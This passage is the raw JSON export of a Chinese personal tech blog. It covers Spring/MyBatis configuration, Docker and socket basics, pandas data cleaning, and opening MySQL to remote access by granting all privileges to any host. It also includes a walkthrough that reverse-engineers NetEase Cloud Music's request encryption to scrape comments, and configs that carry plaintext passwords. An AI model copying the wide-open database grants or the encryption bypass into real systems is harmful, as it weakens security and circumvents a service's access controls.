useSSL=false&amp;amp;useUnicode=true&amp;amp;encoding=utf8\"/&gt; &lt;property name=\"password\" value=\"asdqwe123.\"/&gt;&lt;/bean&gt; 构造SqlsessionFactory 需要设置如下的参数 数据源dataSource 加载mybatis的配置文件 mapperLocation的地址 12345&lt;bean id=\"sqlSessionFactory\" class=\"org.mybatis.spring.SqlSessionFactoryBean\"&gt; &lt;property name=\"dataSource\" ref=\"dataSource\" /&gt; &lt;property name=\"configLocation\" value=\"classpath:mybatisConfig.xml\"/&gt; &lt;property name=\"mapperLocations\" value=\"classpath:com/huzai/mapper/*.xml\"/&gt;&lt;/bean&gt; 构造SqlsessionTemplete(sqlsession) 需要将其注入到ServiceImpl 123&lt;bean id=\"sqlSessionTemplate\" class=\"org.mybatis.spring.SqlSessionTemplate\"&gt; &lt;constructor-arg index=\"0\" ref=\"sqlSessionFactory\"/&gt;&lt;/bean&gt; 声明式事物事物: 要么都成功,要么都失败! 涉及到数据的一致性问题 确保完整性和一致性 事物的ACID原则; 原子性 一致性 隔离性 多个业务可能操作同一个资源,防止数据损害 持久性 Spring中的事物管理申明式事物:AOP配置申明式事物123 &lt;bean id=\"dataSourceTransactionManager\" class=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\"&gt; &lt;constructor-arg ref=\"dataSource\"/&gt;&lt;/bean&gt; 结合aop实现的事物的织入 配置事务通知 1234567 &lt;tx:advice id=\"txAdvice\" transaction-manager=\"dataSourceTransactionManager\"&gt;&lt;!-- 给那些方法配置事物--&gt;&lt;!-- 配置事物的传播特性--&gt; &lt;tx:attributes&gt; &lt;tx:method name=\"add\" propagation=\"REQUIRED\"/&gt; &lt;/tx:attributes&gt; &lt;/tx:advice&gt; 配置事务切入 123456&lt;!-- 配置事物的切入--&gt; &lt;aop:config&gt; &lt;aop:pointcut id=\"txPointCut\" expression=\"execution(* com.huzai.mapper.*.*(..))\"/&gt; &lt;aop:advisor advice-ref=\"txAdvice\" pointcut-ref=\"txPointCut\"/&gt; &lt;/aop:config&gt; 编程式事物:需要在代码中进行事物的管理所有的配置文件头12345678910111213141516&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:aop=\"http://www.springframework.org/schema/aop\" xmlns:context=\"http://www.springframework.org/schema/context\" xmlns:jdbc=\"http://www.springframework.org/schema/jdbc\" xmlns:tx=\"http://www.springframework.org/schema/tx\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/aop https://www.springframework.org/schema/aop/spring-aop.xsd http://www.springframework.org/schema/jdbc http://www.springframework.org/schema/jdbc/spring-jdbc.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd\"&gt;&lt;/beans&gt; 所有的dependency123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.5.5&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.49&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;5.2.0.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt; &lt;version&gt;5.2.0.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;version&gt;1.18.12&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.13&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;/groupId&gt; &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt; &lt;version&gt;1.9.6&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt; &lt;version&gt;5.2.0.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt; &lt;version&gt;2.0.5&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;build&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/java&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;**/*.properties&lt;/include&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/includes&gt; &lt;/resource&gt; &lt;resource&gt; &lt;directory&gt;src/main/resource&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;**/*.properties&lt;/include&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/includes&gt; &lt;/resource&gt; &lt;/resources&gt;&lt;/build&gt;","categories":[],"tags":[]},{"title":"Mybatis学习总结","slug":"Mybatis学习总结","date":"2020-10-16T21:09:05.000Z","updated":"2020-10-16T21:09:14.942Z","comments":true,"path":"2020/10/17/Mybatis学习总结/","link":"","permalink":"http://yoursite.com/2020/10/17/Mybatis学习总结/","excerpt":"","text":"Mybatis 学习总结基本环境配置1.Mybatis-config.xml 配置参数按照如此下顺序配置- properties/settings/typeAliases/typeHandlers/objectFactory/objectWrapperFactory/plugins/environments/databaseIdProvider/mappers 所有的*Mapper.xml需要在Mapper中注册 1234567891011121314151617181920&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt;&lt;!DOCTYPE configuration PUBLIC \"-//mybatis.org//DTD Config 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-config.dtd\"&gt;&lt;configuration&gt; &lt;environments default=\"development\"&gt; &lt;environment id=\"development\"&gt; &lt;transactionManager type=\"JDBC\"/&gt; &lt;dataSource type=\"POOLED\"&gt; &lt;property name=\"driver\" value=\"$&#123;driver&#125;\"/&gt; &lt;property name=\"url\" value=\"$&#123;url&#125;\"/&gt; &lt;property name=\"username\" value=\"$&#123;username&#125;\"/&gt; &lt;property name=\"password\" value=\"$&#123;password&#125;\"/&gt; &lt;/dataSource&gt; &lt;/environment&gt; &lt;/environments&gt; &lt;mappers&gt; &lt;mapper resource=\"org/mybatis/example/BlogMapper.xml\"/&gt; &lt;/mappers&gt;&lt;/configuration&gt; 2.构建sqlsessionFactory123String resource = \"org/mybatis/example/mybatis-config.xml\";InputStream inputStream = Resources.getResourceAsStream(resource);SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); 3.*Mapper.xml 命名空间必须指向方法的接口 123456789&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt;&lt;!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\"&gt;&lt;mapper namespace=\"org.mybatis.example.BlogMapper\"&gt; &lt;select id=\"selectBlog\" resultType=\"Blog\"&gt; select * from Blog where id = #&#123;id&#125; &lt;/select&gt;&lt;/mapper&gt; 于此同时，我们也可以通过注解对一些简单的sql语句映射 12345package org.mybatis.example;public interface BlogMapper &#123; @Select(\"SELECT * FROM blog WHERE id = #&#123;id&#125;\") Blog selectBlog(int id);&#125; XML配置1. properties 加载外部配置文件 1234&lt;properties resource=\"org/mybatis/example/config.properties\"&gt; &lt;property name=\"username\" value=\"dev_user\"/&gt; &lt;property name=\"password\" value=\"F2Fa3!33TYyg\"/&gt;&lt;/properties&gt; 3.typeAliases 设置别名 可以为每个pojo设置；也可以直接指定包名，mybatis会扫描package下面所有的javabean；也可以通过注解 123&lt;typeAliases&gt; &lt;package name=\"domain.blog\"/&gt;&lt;/typeAliases&gt; 4.environments 尽管可以配置多个数据库环境，但每个SqlsessionFactory只能选择一种环境 12345678910111213&lt;environments default=\"development\"&gt; &lt;environment id=\"development\"&gt; &lt;transactionManager type=\"JDBC\"&gt; &lt;property name=\"...\" value=\"...\"/&gt; &lt;/transactionManager&gt; &lt;dataSource type=\"POOLED\"&gt; &lt;property name=\"driver\" value=\"$&#123;driver&#125;\"/&gt; &lt;property name=\"url\" value=\"$&#123;url&#125;\"/&gt; &lt;property name=\"username\" value=\"$&#123;username&#125;\"/&gt; &lt;property name=\"password\" value=\"$&#123;password&#125;\"/&gt; &lt;/dataSource&gt; &lt;/environment&gt;&lt;/environments&gt; 5.mappers 告诉mybatis到哪里寻找配置文件。可以通过直接指定xml文件；也可以通过加载同名class；还可以通过扫描mapper所在的package。 1234&lt;!-- 将包内的映射器接口实现全部注册为映射器 --&gt;&lt;mappers&gt; &lt;package name=\"org.mybatis.builder\"/&gt;&lt;/mappers&gt; XML映射文件 cache – 该命名空间的缓存配置。 cache-ref – 引用其它命名空间的缓存配置。 resultMap – 描述如何从数据库结果集中加载对象，是最复杂也是最强大的元素。 解决pojo中属性名与数据库中列名不想等的情况 12345&lt;resultMap id=\"userResultMap\" type=\"User\"&gt; &lt;id property=\"id\" column=\"user_id\" /&gt; &lt;result property=\"username\" column=\"user_name\"/&gt; &lt;result property=\"password\" column=\"hashed_password\"/&gt;&lt;/resultMap&gt; 12345&lt;select id=\"selectUsers\" resultMap=\"userResultMap\"&gt; select user_id, user_name, hashed_password from some_table where id = #&#123;id&#125;&lt;/select&gt; 多对一的映射 12345678&lt;association property=\"author\" javaType=\"Author\"&gt; &lt;id property=\"id\" column=\"author_id\"/&gt; &lt;result property=\"username\" column=\"author_username\"/&gt; &lt;result property=\"password\" column=\"author_password\"/&gt; &lt;result property=\"email\" column=\"author_email\"/&gt; &lt;result property=\"bio\" column=\"author_bio\"/&gt; &lt;result property=\"favouriteSection\" column=\"author_favourite_section\"/&gt;&lt;/association&gt; 一对多的映射 123&lt;collection property=\"tags\" ofType=\"Tag\" &gt; &lt;id property=\"id\" column=\"tag_id\"/&gt;&lt;/collection&gt; sql – 可被其它语句引用的可重用语句块。 insert – 映射插入语句。 update – 映射更新语句。 delete – 映射删除语句。 select – 映射查询语句 动态sql 本质上是sql的拼接 可以通过sql、when、if、foreach等标签进行控制 if：满足条件就拼接12345678&lt;select id=\"findActiveBlogWithTitleLike\" resultType=\"Blog\"&gt; SELECT * FROM BLOG WHERE state = ‘ACTIVE’ &lt;if test=\"title != null\"&gt; AND title like #&#123;title&#125; &lt;/if&gt;&lt;/select&gt; choose、when、otherwise：只满足其中的一个条件123456789101112131415&lt;select id=\"findActiveBlogLike\" resultType=\"Blog\"&gt; SELECT * FROM BLOG WHERE state = ‘ACTIVE’ &lt;choose&gt; &lt;when test=\"title != null\"&gt; AND title like #&#123;title&#125; &lt;/when&gt; &lt;when test=\"author != null and author.name != null\"&gt; AND author_name like #&#123;author.name&#125; &lt;/when&gt; &lt;otherwise&gt; AND featured = 1 &lt;/otherwise&gt; &lt;/choose&gt;&lt;/select&gt; where：去处第一个满足条件的查询中的and关键字123456789101112131415&lt;select id=\"findActiveBlogLike\" resultType=\"Blog\"&gt; SELECT * FROM BLOG &lt;where&gt; &lt;if test=\"state != null\"&gt; state = #&#123;state&#125; &lt;/if&gt; &lt;if test=\"title != null\"&gt; AND title like #&#123;title&#125; &lt;/if&gt; &lt;if test=\"author != null and author.name != null\"&gt; AND author_name like #&#123;author.name&#125; &lt;/if&gt; &lt;/where&gt;&lt;/select&gt; foreach：对集合进行遍历，尤其是在IN关键字中123456789&lt;select id=\"selectPostIn\" resultType=\"domain.blog.Post\"&gt; SELECT * FROM POST P WHERE ID in &lt;foreach item=\"item\" index=\"index\" collection=\"list\" open=\"(\" separator=\",\" close=\")\"&gt; #&#123;item&#125; &lt;/foreach&gt;&lt;/select&gt; 缓存技术mysql主从复制原理 在每个事物更新数据前，Master服务器在二进制日志中记录这些改变，记录完成后Master服务器通知存储引擎提交事务； Slave服务器将Master服务器的日志复制到其中继日志（Relay log）。首先Slave开始一个工作线程I/O，I/O线程在Master上打开一个连接，开始Binary log dump process，Binary log dump process从Master二进制日志中读取时间，如果已经跟上Master，它会睡眠等待Master产生的新事件。I/O线程将这些时间写入 SQL slave thread（SQL从线程）从中继日志中读取事件，并重放其中的事件从而更新Slave上的数据，使其与Master一致，只要该线程与I/O线程保持一致，中继日志通常会位于系统的缓存中，所以中继日志开销很小。 mysql读写分离原理 读写分离就是在主服务器上写，只在从服务器上读。基本原理是让主数据库处理事务性查询，而从数据库处理select查询。数据库复制被用来把事务性查询导致的变更同步到群集中的数据库。 基于中间代理层实现：代理一般位于客户端和服务端之间，代理服务器接到客户端请求通过判断转发到后端数据库，这部分通过Amoeba实现。","categories":[],"tags":[]},{"title":"mysql远程连接","slug":"mysql远程连接","date":"2020-10-16T12:27:10.000Z","updated":"2020-10-16T13:00:01.777Z","comments":true,"path":"2020/10/16/mysql远程连接/","link":"","permalink":"http://yoursite.com/2020/10/16/mysql远程连接/","excerpt":"","text":"3306 端口 此前确保3306端口是打开的(服务器防火墙) 在服务器中查看端口状态 1netstat -an|grep 3306 如果仅仅出现👇下面的信息,则说明3306端口仅仅对localhost开放,外网是无法访问的 1tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN 你需要找到mysql.cnf mysql 的配置文件,有可能不止一个,且不一定和我的文件名一样, 找到.cnf配置文件中的,将其注释 1#bind-address = 127.0.0.1 如果像我这样,就说明端口是开放的,且已经有主机连接 mysql用户权限 在mysql的mysql表中,有用户信息 查看你的用户是否允许,除localhost以外的ip访问 1select host,user from user; 如图,想要外网访问的用户,其对应的host应该是外网ip 如果想要任意ip访问,其对应的host设置为“%” 或者你可以直接创建一个新用户,给他权限 12grant all on database_name.* to user_name@&apos;%&apos; identified by &apos;user_password&apos;;flush privileges;","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"}]},{"title":"ubuntu自动换源","slug":"ubuntu自动换源","date":"2020-07-09T04:59:50.000Z","updated":"2020-07-09T05:00:41.196Z","comments":true,"path":"2020/07/09/ubuntu自动换源/","link":"","permalink":"http://yoursite.com/2020/07/09/ubuntu自动换源/","excerpt":"","text":"下载huanyuan.sh1git clone git@github.com:huzai9527/ubuntu_huanyuan.git 进入文件夹1sudo bash huanyuan.sh 期间需要你输入管理员密码","categories":[],"tags":[{"name":"ubuntu","slug":"ubuntu","permalink":"http://yoursite.com/tags/ubuntu/"}]},{"title":"python网络编程","slug":"python网络编程","date":"2020-07-08T03:46:04.000Z","updated":"2020-10-16T12:40:24.047Z","comments":true,"path":"2020/07/08/python网络编程/","link":"","permalink":"http://yoursite.com/2020/07/08/python网络编程/","excerpt":"","text":"套接字类型面向连接的套接字- 基于TCP/IP，使用SOCKET_STREAM作为套接字类型 无连接的套接字- 基于UDP/IP，使用SOCKET_DGRAM作为套接字类型 pyhton中的网络编程socket模块1socket(socket_family, socket_type, protocol = 0) 其中socket_family 是选择网络类型,本地网（AF_UNIX）还是因特网(AF_INET) socket_type 是选择套接字的类型, protocaol默认为0 套接字对象常用的方法 服务器套接字123s.bind() #将主机号端口号绑定到套接字上s.listen() #设置并启动TCP监听器s.accept() #被动接受客户端连接 客户端套接字12s.connect() #主动发起TCP服务连接s.connect_ex() #此时会以错误码的形式抛出问题而不是一大串异常 创建一个时间戳服务器12345678910111213141516171819202122from socket import *from time import ctimeHOST = ''PORT = 23456ADDR = (HOST, PORT)BUFSIZE = 1024tcpSerSocket = socket(AF_INET,SOCK_STREAM)tcpSerSocket.bind(ADDR)tcpSerSocket.listen(5)while True: print(\"waiting for connection ...\") tcpCliSocket, addr = tcpSerSocket.accept() print(\"connected from:\", addr) while True: data = tcpCliSocket.recv(BUFSIZE) if not data: break tcpCliSocket.send(data+b' time now:'+bytes(ctime(), 'utf-8')) tcpCliSocket.close()tcpSerSocket.close() 创建一个客户机1234567891011121314from socket import *from time import ctimeHOST = \"192.168.0.118\"PORT = 23456ADDR = (HOST, PORT)BUFSIZE = 1024tcpCliSocket = socket(AF_INET, SOCK_STREAM)tcpCliSocket.connect(ADDR)while True: data = input('&gt; ') if not data: break","categories":[],"tags":[{"name":"网络编程 python","slug":"网络编程-python","permalink":"http://yoursite.com/tags/网络编程-python/"}]},{"title":"docker常用命令","slug":"docker常用命令","date":"2020-07-01T04:53:24.000Z","updated":"2020-07-03T04:49:37.734Z","comments":true,"path":"2020/07/01/docker常用命令/","link":"","permalink":"http://yoursite.com/2020/07/01/docker常用命令/","excerpt":"","text":"docker command help1docker command --help use imageslist images1docker images start container by image1docker run -t -i ubuntu:16.04 /bin/bash search images1docker search mysql get new images1docker pull ubuntu:18.04 delete image1docker rmi ubuntu:18.04 [more operations][https://www.runoob.com/docker/docker-image-usage.html] use containerstart container1docker run -t -i ubuntu:16.04 /bin/bash ## -d background show containers1docker ps -a stop &amp; start &amp; restart container123docker start container_id ## RUN IN THE BACKGROUNDdocker stop container_iddocker restart container_id enter container1docker attach container_id ## use exit will stop container 1docker exec -it container_id /bin/bash ## use exit will not stop container export container1docker export container_id &gt; container.tar import container_snap to image1cat docker/mysql.tar | docker import - mysql:v1 delete container1docker rm -f container_id show container’s port mapping1docker port container_id connect container by port mapping1docker run -d -p 3306:3306 -e MYSQL_ROOT_PASSWORD = 123456 mysql connect containerscreate a docker network1docker network create -d bridge hadoop-net show networks1docker network ls run a container and connect to the network1docker run -itd --name hadoop1 --network hadoop-net ubuntu /bin/bash","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"http://yoursite.com/tags/docker/"}]},{"title":"测试异地管理","slug":"测试异地管理","date":"2020-06-30T12:37:13.000Z","updated":"2020-07-01T05:35:35.561Z","comments":true,"path":"2020/06/30/测试异地管理/","link":"","permalink":"http://yoursite.com/2020/06/30/测试异地管理/","excerpt":"","text":"test","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2020-06-30T12:29:17.397Z","updated":"2020-06-30T12:29:17.397Z","comments":true,"path":"2020/06/30/hello-world/","link":"","permalink":"http://yoursite.com/2020/06/30/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"数据分析----数据清洗","slug":"数据分析-数据清洗","date":"2019-01-20T00:03:42.000Z","updated":"2020-06-30T12:29:17.403Z","comments":true,"path":"2019/01/20/数据分析-数据清洗/","link":"","permalink":"http://yoursite.com/2019/01/20/数据分析-数据清洗/","excerpt":"","text":"数据分析—-数据清洗一、导入数据1234import pandas as pdimport numpy as npfrom pandas import Series,DataFrameimport xlrd 12df = DataFrame(pd.read_excel('datas/grades.xlsx')) print(df) Unnamed: 0 Unnamed: 1 Unnamed: 2 Unnamed: 3 0 蒋广佳 43.0 69.0 61.0 1 廖菲 80.0 64.0 62.0 2 沈秀玲 68.0 74.0 98.0 3 韦丹 48.0 53.0 64.0 4 张梦雅 72.0 73.0 96.0 5 赵雅欣 60.0 NaN 70.0 6 曹海广 74.0 60.0 20.0 7 陈泽灿 38.0 21.0 92.0 8 NaN 88.0 67.0 84.0 9 高海亮 86.0 74.0 96.0 10 顾晓冬 84.0 60.0 90.0 11 侯星宇 64.0 111.0 NaN 12 江宜哲 60.0 33.0 70.0 13 NaN NaN NaN NaN 14 梁杨杨 68.0 54.0 94.0 15 刘辉 NaN 63.0 98.0 16 罗嘉豪 39.0 44.0 56.0 17 施亚君 90.0 63.0 90.0 18 孙添 64.0 63.0 78.0 19 王杰 74.0 NaN 76.0 20 王泽 52.0 48.0 94.0 21 NaN 60.0 69.0 74.0 22 杨福程 70.0 49.0 76.0 23 尤澳晨 91.0 67.0 86.0 24 翟佳 78.0 73.0 88.0 25 张旭 100.0 60.0 98.0 26 支星哲 80.0 63.0 100.0 27 邹湘涛 54.0 40.0 90.0 我们可以看见上面的数据是缺少标注的，列名缺少标注；并且有很多是空值，因此我们要对数据进行清洗，提高数据的质量。在这里数据清洗有四个要点简称“完全合一” 完整性：单条数据是否完整，统计的字段是否完善。 全面性：观察某一列的全部数值，选中一列，我们可以看到最大值，最小值，平均值。我们可以通过常识判断数据是否合理，比如：数据定义、单位标识、数值本身。 合法性：数据的类型、内容、大小的合法性。比如数据中存在非ASCII字符，性别存在未知，总分超过100等。 唯一性：数据是否存在重复记录，由于数据来源于不同的渠道，重复的情况是非常常见的。行数据、列数据都需要是唯一的。 事实上数据清洗的标准有差不多七八条，有兴趣的可以了解一下，这里归纳为“完全合一”四条，按照这四条基本上可以解决数据清洗中的大部分问题，使得数据标准、干净、连续。 二、开始数据清洗1、完整性problem 1:空行 solution: 删除 1df.dropna(how=\"all\",inplace=True) problem 2:缺失值 solution： 删除：删除数据缺失的记录 均值：使用当前列的均值 高频：使用当前列出现平率最高的数据 首先我们先把列的标注补上 1df = df.rename(columns=&#123;'Unnamed: 0':'index','Unnamed: 1':'math','Unnamed: 2':'english','Unnamed: 3':'c++'&#125;) 1df = df.drop(columns='index') 1print(df) math english c++ 0 43.0 69.0 61.0 1 80.0 64.0 62.0 2 68.0 74.0 98.0 3 48.0 53.0 64.0 4 72.0 73.0 96.0 5 60.0 NaN 70.0 6 74.0 60.0 20.0 7 38.0 21.0 92.0 8 88.0 67.0 84.0 9 86.0 74.0 96.0 10 84.0 60.0 90.0 11 64.0 111.0 NaN 12 60.0 33.0 70.0 14 68.0 54.0 94.0 15 NaN 63.0 98.0 16 39.0 44.0 56.0 17 90.0 63.0 90.0 18 64.0 63.0 78.0 19 74.0 NaN 76.0 20 52.0 48.0 94.0 21 60.0 69.0 74.0 22 70.0 49.0 76.0 23 91.0 67.0 86.0 24 78.0 73.0 88.0 25 100.0 60.0 98.0 26 80.0 63.0 100.0 27 54.0 40.0 90.0 现在我们想对df[‘math’]中缺失的值用平均值代替 1df['math'].fillna(df['math'].mean(),inplace=True) 1print(df) math english c++ 0 43.000000 69.0 61.0 1 80.000000 64.0 62.0 2 68.000000 74.0 98.0 3 48.000000 53.0 64.0 4 72.000000 73.0 96.0 5 60.000000 NaN 70.0 6 74.000000 60.0 20.0 7 38.000000 21.0 92.0 8 88.000000 67.0 84.0 9 86.000000 74.0 96.0 10 84.000000 60.0 90.0 11 64.000000 111.0 NaN 12 60.000000 33.0 70.0 13 68.653846 NaN NaN 14 68.000000 54.0 94.0 15 68.653846 63.0 98.0 16 39.000000 44.0 56.0 17 90.000000 63.0 90.0 18 64.000000 63.0 78.0 19 74.000000 NaN 76.0 20 52.000000 48.0 94.0 21 60.000000 69.0 74.0 22 70.000000 49.0 76.0 23 91.000000 67.0 86.0 24 78.000000 73.0 88.0 25 100.000000 60.0 98.0 26 80.000000 63.0 100.0 27 54.000000 40.0 90.0 如果想用最高频率的数据对english进行填充，可以通过value_counts获取math字段最高频次english_maxf,然后对其进行填充 1english_maxf = df['english'].value_counts().index[0] 1df['english'].fillna(english_maxf,inplace=True) 1print(df) math english c++ 0 43.000000 69.0 61.0 1 80.000000 64.0 62.0 2 68.000000 74.0 98.0 3 48.000000 53.0 64.0 4 72.000000 73.0 96.0 5 60.000000 63.0 70.0 6 74.000000 60.0 20.0 7 38.000000 21.0 92.0 8 88.000000 67.0 84.0 9 86.000000 74.0 96.0 10 84.000000 60.0 90.0 11 64.000000 111.0 NaN 12 60.000000 33.0 70.0 13 68.653846 63.0 NaN 14 68.000000 54.0 94.0 15 68.653846 63.0 98.0 16 39.000000 44.0 56.0 17 90.000000 63.0 90.0 18 64.000000 63.0 78.0 19 74.000000 63.0 76.0 20 52.000000 48.0 94.0 21 60.000000 69.0 74.0 22 70.000000 49.0 76.0 23 91.000000 67.0 86.0 24 78.000000 73.0 88.0 25 100.000000 60.0 98.0 26 80.000000 63.0 100.0 27 54.000000 40.0 90.0 2、全面性problem：列数据单位不统一solution：将不同的单位的找出来，将其进行迭代替换，比如说将榜（lbs）转化为千克（kgs） 12345678# 获取 weight 数据列中单位为 lbs 的数据rows_with_lbs = df['weight'].str.contains('lbs').fillna(False)print df[rows_with_lbs]# 将 lbs 转换为 kgs, 2.2lbs=1kgsfor i,lbs_row in df[rows_with_lbs].iterrows(): # 截取从头开始到倒数第三个字符之前，即去掉 lbs。 weight = int(float(lbs_row['weight'][:-3])/2.2) df.at[i,'weight'] = '&#123;&#125;kgs'.format(weight) 3、合理性problem:非ASCII字符solution:对于非ASCII字符，我们可以采用删除或者替换的方式，我们直接选择删除 1df['name'].replace(&#123;r'[^\\x00-\\x7f]+':''&#125;,regex=True,inplace=True) 4、唯一性problem1：一列有多个参数solution：比如英文名字，是有两部分组成的，包含两个参数Firstname、Lastnamr，我们需要将name一列拆分为Firstname和Lastname两个字段，我们可以采用split方法，对其进行切分 12df['First_namr','Last_name'] = df['name'].str.split(expand=True)df.drop('name',axis=1,inplace=True) problem2:重读数据solution：我们校验数据是否存在重复数据，如果有重复数据，如果就用pandas提供的drop_duplicates()来删除重复数据。 1df.drop_duplicates(['First_name','Last_name'],inplace=True)","categories":[],"tags":[{"name":"数据分析","slug":"数据分析","permalink":"http://yoursite.com/tags/数据分析/"}]},{"title":"爬取网易云热评并生成词云","slug":"爬取网易云热评并生成词云","date":"2019-01-12T02:06:39.000Z","updated":"2020-06-30T12:29:17.403Z","comments":true,"path":"2019/01/12/爬取网易云热评并生成词云/","link":"","permalink":"http://yoursite.com/2019/01/12/爬取网易云热评并生成词云/","excerpt":"","text":"分析热评的请求URL 首先我们先对请求抓包，发现所有的评论都包含在 https://music.163.com/weapi/v1/resource/comments/R_SO_4_32785700?csrf_token=&quot;里面，然后再去分析这个请求，发现这是一个POST请求，请求参数由两个params以及encSecKey。好了到此我们需要的东西都有了，接下来我们分析如何去得到这两个参数。 找到请求 分析请求参数 分析js加密 找到全局js文件，找到两个参数所在的位置 发现这两个参数是由window.asrsea获得的，接着去定位到这个函数找到对应的原函数d 对js进行调试，发现d的四个参数，有三个是定值，这个函数还用到了a、b、c三个函数 其中a是产生一个16位的随机数（这里我直接让它等于FwtEYduOXlNEHbLP）为什么要等与这个呢 hhh 因为我发现这个随机数，他在生成encText的时候用了一次，生成encSecKey的时候，又用了一次，而且encSecKey就只跟这个随机数相关，所以让这个随机数为定值的话，就可以直接得到encSecKey的值，不用再去搞一个rsa加密，为了让你们看清楚，我还是把贴出来把 b函数就是我们主要要解决的AES加密，经过调试，我们可以知道它的两个参数a、b分别是加密字符转、密钥。以及AES的偏移量为0102030405060708、加密模式为CBC 接下来看c函数，c函数其实是RSA加密，获取encSecKey的值的他的三个参数，只有a是变量，是我们随机生成的16为随机数，这里我们就默认为定值，b、c应该是和rsa加密有关的参数，应为本身并没有学过加密，这里我就不多说了，但是经过调试，我们可以知道b、c是定值 b =010001 c是一大串字符串。见下图。 最后我们具体分析一下d函数，经过N次调试，我发现这其实和我的想法差不多，h是一个字典，包含了我们需要的两个参数。encText是由两次AES加密产生的及两次b，加密字符串是一样的，然后密钥第一次是个定值0CoJUm6Qyw8W8jud，第二次是16位随机数，也相当于定值。所以encText就出来了，params是由一次RSA加密产生的，并且只与16位的随机数有关，这里就清楚为什么我让随机数直接等于FwtEYduOXlNEHbLP，哈哈。因为我调试的时候，刚好出现了这么个随机数，于是我就直接拿过来用了，这个随机数对应的encSecKey = 81e7a41af9830200d5606be1a632e57eb0006b3cdae579127115c6323d4c4802f3af9efcee21d9f4126dde266773cbd795f19ae44028f9f8d038cd62d2816952fa99bb61ecb5fba87d5b178ff4b982ee34c7491808f7cb774554a0235a210caf2e5e867a0e2ebdf6f994be1b198ab43b14ce1f7cfa6f80b9070dea5fc5d6c712 用python重写js加密 经过js加密码的分析，我用python实现了一下AES加密，具体代码如下，包含两个参数，一个是需要加密的字符串，一个是密钥具体如下 1234567def AES_encrypt(text, key): pad = 16 - len(text) % 16 text = text + pad * chr(pad) encryptor = AES.new(key, AES.MODE_CBC, \"0102030405060708\") encrypt_text = encryptor.encrypt(text) encrypt_text = base64.b64encode(encrypt_text) return encrypt_text 两次调用这个函数。得到结果与调试的结果对比，一模一样。哈哈，上代码、上图 1234f_key = \"0CoJUm6Qyw8W8jud\"text = \"&#123;\\\"rid\\\":\\\"R_SO_4_32785700\\\",\\\"offset\\\":\\\"20\\\",\\\"total\\\":\\\"true\\\",\\\"limit\\\":\\\"20\\\",\\\"csrf_token\\\":\\\"\\\"&#125;\"rs = AES_encrypt(text, f_key)params = AES_encrypt(str(rs)[2:-1], \"FwtEYduOXlNEHbLP\") 这里解释一下，text是我进过N次调试得出的，因为在请求评论之前，text有好几个值来验证其他的东西，这里我大概理解了一下text的含义，这里我们只要知道offset是偏移量，limit是每次请求多少条，比如你请求前二十条则offset=0，limit = 20，我上面的是请求20-40条。 然后直接获取的encSecKey直接赋值就好啦，结合这两个参数，我们的请求参数就构造好了，直接POST吧，就能得到评论啦，哈哈，上代码，上图 1234567891011121314 data = &#123; 'params': params, 'encSecKey': encSecKey&#125;headers = &#123; 